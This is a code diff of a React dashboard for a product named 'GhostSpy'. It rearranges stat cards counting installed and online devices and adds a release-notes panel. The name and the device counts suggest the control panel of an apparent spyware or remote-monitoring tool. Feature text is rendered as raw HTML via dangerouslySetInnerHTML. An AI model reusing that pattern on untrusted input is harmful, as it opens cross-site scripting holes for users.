@@ -9,6 +9,7 @@ import { OverviewTotalProfit } from "src/sections/overview/overview-total-profit
 import { AuthContext } from "src/contexts/auth-context";
 
 import Color from "src/theme/colors";
+import { Calculate } from "@mui/icons-material";
 
 const now = new Date();
 
@@ -29,6 +30,8 @@ export const DashboardContent = () => {
       setOnlineDevices(onlineDevicesCount);
     }
   }, [user, devices]);
+
+  const versions = t("dashboard.introduce.versions", { returnObjects: true });
 
   return (
     <div
@@ -105,7 +108,82 @@ export const DashboardContent = () => {
               </div>
             </div>
 
-            <div
+            <div style={{ display: "flex", flexWrap: "wrap", gap: "16px", marginTop: "25px" }}>
+              <div
+                style={{
+                  flex: "1 calc(50% - 16px)",
+                  minWidth: "200px",
+                }}
+              >
+                <OverviewBudget
+                  difference={12}
+                  positive
+                  sx={{
+                    height: "100%",
+                    backgroundColor: Color.background.main_gray01,
+                    border: `solid 1px ${Color.background.border}`,
+                    borderRadius: "5px",
+                    padding: "16px",
+                  }}
+                  value={installedDevices}
+                />
+              </div>
+              <div
+                style={{
+                  flex: "1 calc(50% - 16px)",
+                  minWidth: "200px",
+                }}
+              >
+                <OverviewTotalCustomers
+                  difference={16}
+                  positive={false}
+                  sx={{
+                    height: "100%",
+                    backgroundColor: Color.background.main_gray01,
+                    border: `solid 1px ${Color.background.border}`,
+                    borderRadius: "5px",
+                    padding: "16px",
+                  }}
+                  value={onlineDevices.toString()}
+                />
+              </div>
+              <div
+                style={{
+                  flex: "1 calc(50% - 16px)",
+                  minWidth: "200px",
+                }}
+              >
+                <OverviewTasksProgress
+                  sx={{
+                    height: "100%",
+                    backgroundColor: Color.background.main_gray01,
+                    border: `solid 1px ${Color.background.border}`,
+                    borderRadius: "5px",
+                    padding: "16px",
+                  }}
+                  value={installedDevices}
+                />
+              </div>
+              <div
+                style={{
+                  flex: "1 calc(50% - 16px)",
+                  minWidth: "200px",
+                }}
+              >
+                <OverviewTotalProfit
+                  sx={{
+                    height: "100%",
+                    backgroundColor: Color.background.main_gray01,
+                    border: `solid 1px ${Color.background.border}`,
+                    borderRadius: "5px",
+                    padding: "16px",
+                  }}
+                  value="Online"
+                />
+              </div>
+            </div>
+
+            {/* <div
               style={{
                 backgroundColor: Color.background.main_gray01,
                 border: `solid 1px ${Color.background.border}`,
@@ -237,81 +315,103 @@ export const DashboardContent = () => {
                   </Typography>
                 </div>
               </div>
-            </div>
+            </div> */}
           </div>
+
           <div style={{ flex: "1 calc(50% - 16px)", minWidth: "200px" }}>
-            <div style={{ display: "flex", flexWrap: "wrap", gap: "16px" }}>
+            <div
+              style={{
+                backgroundColor: Color.background.main_gray01,
+                border: `solid 1px ${Color.background.border}`,
+                borderRadius: "5px",
+                padding: "16px",
+                maxHeight: "760px",
+                overflowY: "scroll",
+              }}
+            >
+              {" "}
               <div
                 style={{
-                  flex: "1 calc(50% - 16px)",
-                  minWidth: "200px",
+                  borderBottom: `solid 2px ${Color.background.border}`,
+                  display: "flex",
+                  justifyContent: "space-between",
                 }}
               >
-                <OverviewBudget
-                  difference={12}
-                  positive
+                <Typography
                   sx={{
-                    height: "100%",
-                    backgroundColor: Color.background.main_gray01,
-                    border: `solid 1px ${Color.background.border}`,
-                    borderRadius: "5px",
-                    padding: "16px",
+                    color: Color.text.primary,
+                    fontSize: "24px",
+                    fontFamily: "Bebas Neue, sans-serif",
+                    pb: 1,
                   }}
-                  value={installedDevices}
-                />
+                >
+                  {"GhostSpy"}
+                </Typography>
               </div>
+              {/*  */}
               <div
-                style={{
-                  flex: "1 calc(50% - 16px)",
-                  minWidth: "200px",
-                }}
+                style={{ marginTop: "20px", display: "flex", flexDirection: "column", gap: "10px" }}
               >
-                <OverviewTotalCustomers
-                  difference={16}
-                  positive={false}
-                  sx={{
-                    height: "100%",
-                    backgroundColor: Color.background.main_gray01,
-                    border: `solid 1px ${Color.background.border}`,
-                    borderRadius: "5px",
-                    padding: "16px",
-                  }}
-                  value={onlineDevices.toString()}
-                />
-              </div>
-              <div
-                style={{
-                  flex: "1 calc(50% - 16px)",
-                  minWidth: "200px",
-                }}
-              >
-                <OverviewTasksProgress
-                  sx={{
-                    height: "100%",
-                    backgroundColor: Color.background.main_gray01,
-                    border: `solid 1px ${Color.background.border}`,
-                    borderRadius: "5px",
-                    padding: "16px",
-                  }}
-                  value={installedDevices}
-                />
-              </div>
-              <div
-                style={{
-                  flex: "1 calc(50% - 16px)",
-                  minWidth: "200px",
-                }}
-              >
-                <OverviewTotalProfit
-                  sx={{
-                    height: "100%",
-                    backgroundColor: Color.background.main_gray01,
-                    border: `solid 1px ${Color.background.border}`,
-                    borderRadius: "5px",
-                    padding: "16px",
-                  }}
-                  value="Online"
-                />
+                {Array.isArray(versions) ? (
+                  versions.map((version, index) => (
+                    <div
+                      key={index}
+                      style={{
+                        display: "flex",
+                        flexDirection: "column",
+                        gap: "10px",
+
+                        paddingBottom: "15px",
+                      }}
+                    >
+                      <Typography
+                        sx={{
+                          fontSize: "18px",
+                          color: Color.text.purple,
+                          fontFamily: "Bebas Neue, sans-serif",
+                        }}
+                      >
+                        {version.version}
+                      </Typography>
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.greeting}
+                      </Typography>
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.introduce}
+                      </Typography>
+
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.title}
+                      </Typography>
+                      <div style={{ paddingLeft: "10px" }}>
+                        {version.features.map((feature, featureIndex) => (
+                          <Typography
+                            key={featureIndex}
+                            sx={{ color: Color.text.primary, fontSize: "14px", lineHeight: "24px" }}
+                            dangerouslySetInnerHTML={{
+                              __html: `<span style='font-weight: 600'>${feature.title}: </span>${feature.description}`,
+                            }}
+                          />
+                        ))}
+                      </div>
+
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.feedback}
+                      </Typography>
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.thanks}
+                      </Typography>
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.under}
+                      </Typography>
+                      <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
+                        {version.supporter}
+                      </Typography>
+                    </div>
+                  ))
+                ) : (
+                  <Typography sx={{ color: "red" }}>Error: Versions not found.</Typography>
+                )}
               </div>
             </div>
           </div>
